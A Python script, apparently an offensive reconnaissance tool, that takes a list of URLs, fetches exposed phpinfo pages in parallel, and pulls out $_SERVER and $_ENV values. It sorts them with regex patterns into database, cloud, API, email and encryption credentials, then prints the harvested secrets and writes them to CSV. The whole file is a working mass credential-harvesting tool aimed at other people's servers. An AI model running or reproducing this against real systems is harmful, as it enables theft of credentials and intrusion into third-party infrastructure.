import re
import requests
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor
import argparse
import csv
from termcolor import colored

# Categorisation for extracted sensitive data
categories = {
    "Database Credentials": [r"DB_(HOST|USER|PASS|PASSWORD|NAME|PORT|URL)", r"DATABASE_(USER|PASS|PASSWORD|HOST|PORT|URL)", r"MYSQL_(USER|PASS|PASSWORD|DATABASE|HOST)", r"PGSQL_(USER|PASS|PASSWORD|DATABASE|HOST)", r"MONGO_(USER|PASS|PASSWORD|DB|URI)", r"REDIS_(PASS|PASSWORD|HOST)"],
    "API Keys": [r"(API|ACCESS|SECRET|PRIVATE|PUBLIC|TWILIO|SLACK|SENDGRID|GITHUB|GITLAB|BITBUCKET|PLAID)_KEY", r"(API|ACCESS|SECRET|PRIVATE|PUBLIC|TWILIO|SLACK|SENDGRID|GITHUB|GITLAB|BITBUCKET|PLAID)API_KEY", r"OAUTH_(KEY|SECRET|TOKEN)", r"JWT_(KEY|SECRET|TOKEN)", r"SESSION_KEY"],
    "File Paths": [r"(CONFIG|LOG|TMP)_PATH"],
    "Authentication Tokens": [r"(SESSION|JWT|OAUTH|CSRF|ACCESS|REFRESH|SIGNING)_TOKEN"],
    "Encryption Keys": [r"(SSL_CERT|TLS_PRIVATE_KEY|PRIVATE_KEY|PUBLIC_KEY|ENCRYPTION_KEY|GPG_KEY|SSH_KEY|RSA_PRIVATE_KEY)"],
    "Email Credentials": [r"(SMTP_SERVER|SMTP_USER|SMTP_PASS|SMTP_PASSWORD|EMAIL_USER|EMAIL_PASS|EMAIL_PASSWORD)"],
    "Service Endpoints": [r"(INTERNAL|EXTERNAL)_SERVICE_URL"],
    "Environment Variables": [r"(APP|SYSTEM|HOME|USER|PWD|LOGNAME|SHELL)"],
    "Server Information": [r"(SERVER_IP|SERVER_HOSTNAME|SERVER_SOFTWARE|SERVER_PROTOCOL|SERVER_NAME|REMOTE_ADDR)"],
    "Cloud Credentials": [r"AWS_ACCESS_KEY", r"AWS_SECRET_ACCESS_KEY", r"AWS_SESSION_TOKEN", r"AZURE_STORAGE_KEY", r"AZURE_CLIENT_ID", r"AZURE_CLIENT_SECRET", r"GCP_API_KEY", r"GCP_SERVICE_ACCOUNT", r"GCP_ACCESS_KEY", r"GCP_SECRET_KEY", r"S3_BUCKET", r"S3_SECRET", r"S3_KEY", r"GCS_BUCKET", r"BLOB_STORAGE", r"MSI_SECRET", r"DO_API_KEY", r"LINODE_ACCESS_KEY", r"ORACLE_CLOUD_SECRET"],
    "Miscellaneous Secrets": [r"(STRIPE_KEY|STRIPE_SECRET)"]
}

category_counts = {category: 0 for category in categories}

def categorize_secret(key):
    for category, patterns in categories.items():
        if any(re.search(pattern, key.upper()) for pattern in patterns):
            category_counts[category] += 1
            return category
    return "Uncategorized"

def extract_sensitive_info(file_path):
    with open(file_path, 'r') as file:
        urls = [line.strip() for line in file.readlines() if line.strip()]
    
    extracted_data = []
    with ThreadPoolExecutor(max_workers=20) as executor:
        results = executor.map(process_url, urls)
    
    extracted_data.extend(filter(lambda x: x and x['sensitive_info'], results))
    return extracted_data, len(urls), len(extracted_data)

def process_url(url):
    sensitive_info = scrape_phpinfo(url)
    if sensitive_info:
        return {
            "url": url,
            "sensitive_info": sensitive_info
        }
    return None

def scrape_phpinfo(url):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            extracted_data = {}
            
            for row in soup.find_all('tr'):
                columns = row.find_all('td')
                if len(columns) == 2:
                    key, value = columns[0].text.strip(), columns[1].text.strip()
                    if value.lower() != "no value" and (key.startswith("$_SERVER") or key.startswith("$_ENV")):
                        extracted_data[key] = {"value": value, "category": categorize_secret(key)}
            
            return extracted_data if extracted_data else None
    except requests.exceptions.RequestException:
        return None

def save_to_csv(extracted_info, output_file):
    with open(output_file, mode='w', newline='', encoding='utf-8') as file:
        writer = csv.writer(file)
        writer.writerow(["Category", "Domain/URL", "Sensitive Information Exposed"])

        for info in extracted_info:
            for key, data in info['sensitive_info'].items():
                writer.writerow([data['category'], info['url'], f"{key}: {data['value']}"])

def main():
    parser = argparse.ArgumentParser(description="Extract sensitive $_SERVER and $_ENV variables from phpinfo pages.")
    parser.add_argument("input_file", help="Input file containing URLs")
    parser.add_argument("-o", "--output", help="Output file to save results", default=None)
    args = parser.parse_args()
    
    extracted_info, total_urls, sensitive_urls = extract_sensitive_info(args.input_file)
    
    if args.output:
        save_to_csv(extracted_info, args.output)
        print(f"Results have been saved to {args.output}")
    
    for info in extracted_info:
        print(colored(f"URL: {info['url']}", "cyan"))
        print(colored("Sensitive Information:", "red"))
        
        for key, data in info['sensitive_info'].items():
            print(colored(f"{key} ({data['category']}): {data['value']}", "yellow"))
        print("-" * 50)
    
    print(colored(f"Total Domains Processed: {total_urls}", "yellow"))
    print(colored(f"Domains with Sensitive Information: {sensitive_urls}", "yellow"))
    print(colored("Categorization Counts:", "yellow"))
    for category, count in category_counts.items():
        print(colored(f"{category}: {count}", "yellow"))

if __name__ == "__main__":
    main()
